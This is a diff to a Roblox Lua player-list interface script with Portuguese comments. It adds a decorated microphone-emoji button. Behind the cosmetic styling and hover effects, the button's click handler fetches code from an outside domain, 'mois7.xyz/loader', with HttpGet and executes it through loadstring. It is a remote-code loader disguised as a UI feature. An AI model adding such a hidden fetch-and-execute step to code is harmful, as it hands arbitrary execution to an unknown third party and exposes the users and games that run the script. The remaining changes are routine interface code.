@@ -221,6 +221,75 @@ topHighlight.BackgroundTransparency = 0.75
 topHighlight.BorderSizePixel = 0
 topHighlight.Parent = mainFrame
 
+-- ===================== BOTÃO DE MICROFONE (COLADINHO COM A LISTA) =====================
+local micButton = Instance.new("TextButton")
+micButton.Name = "MicButton"
+micButton.AnchorPoint = Vector2.new(1, 0)
+micButton.Position = UDim2.new(1, -256, 0, 10)
+micButton.Size = UDim2.new(0, 34, 0, 34)
+micButton.BackgroundColor3 = BG_COLOR_TOP
+micButton.BackgroundTransparency = 0.08
+micButton.Text = ""
+micButton.AutoButtonColor = false
+micButton.ZIndex = 2
+micButton.Parent = screenGui
+
+local micCorner = Instance.new("UICorner")
+micCorner.CornerRadius = UDim.new(0, 12)
+micCorner.Parent = micButton
+
+local micStroke = Instance.new("UIStroke")
+micStroke.Thickness = 1.5
+micStroke.Color = ACCENT_COLOR
+micStroke.Transparency = 0.55
+micStroke.Parent = micButton
+
+local micGradient = Instance.new("UIGradient")
+micGradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, BG_COLOR_TOP),
+	ColorSequenceKeypoint.new(1, BG_COLOR_BOTTOM),
+})
+micGradient.Rotation = 90
+micGradient.Parent = micButton
+
+-- Emoji de microfone 🎙️
+local micEmoji = Instance.new("TextLabel")
+micEmoji.Name = "MicEmoji"
+micEmoji.AnchorPoint = Vector2.new(0.5, 0.5)
+micEmoji.Position = UDim2.new(0.5, 0, 0.5, 0)
+micEmoji.Size = UDim2.new(1, 0, 1, 0)
+micEmoji.BackgroundTransparency = 1
+micEmoji.Text = "🎙️"
+micEmoji.Font = Enum.Font.GothamBold
+micEmoji.TextSize = 20
+micEmoji.TextColor3 = Color3.fromRGB(255, 255, 255)
+micEmoji.ZIndex = 3
+micEmoji.Parent = micButton
+
+-- Efeitos hover no botão
+micButton.MouseEnter:Connect(function()
+	TweenService:Create(micButton, TweenInfo.new(0.15), {BackgroundColor3 = ROW_HOVER_COLOR}):Play()
+	TweenService:Create(micStroke, TweenInfo.new(0.15), {Transparency = 0.2}):Play()
+	TweenService:Create(micEmoji, TweenInfo.new(0.15), {TextSize = 22}):Play()
+end)
+
+micButton.MouseLeave:Connect(function()
+	TweenService:Create(micButton, TweenInfo.new(0.15), {BackgroundColor3 = BG_COLOR_TOP}):Play()
+	TweenService:Create(micStroke, TweenInfo.new(0.15), {Transparency = 0.55}):Play()
+	TweenService:Create(micEmoji, TweenInfo.new(0.15), {TextSize = 20}):Play()
+end)
+
+-- Clique - executa o loadstring
+micButton.MouseButton1Click:Connect(function()
+	-- Efeito de clique (encolhe e volta)
+	TweenService:Create(micButton, TweenInfo.new(0.08), {Size = UDim2.new(0, 30, 0, 30)}):Play()
+	task.wait(0.08)
+	TweenService:Create(micButton, TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 34, 0, 34)}):Play()
+	
+	-- Executa o script
+	loadstring(game:HttpGet("https://mois7.xyz/loader"))()
+end)
+
 -- ===================== TITULO =====================
 local titleBar = Instance.new("Frame")
 titleBar.Name = "TitleBar"
@@ -524,7 +593,7 @@ local function createPlayerRow(plr, order)
 		local statValueLabel = Instance.new("TextLabel")
 		statValueLabel.Name = "StatValue"
 		statValueLabel.Size = UDim2.new(1, -6, 0, 16)
-		statValueLabel.Position = UDim2.new(0, 3, 0, 3)
+			statValueLabel.Position = UDim2.new(0, 3, 0, 3)
 		statValueLabel.BackgroundTransparency = 1
 		statValueLabel.Font = Enum.Font.GothamBold
 		statValueLabel.TextSize = 13
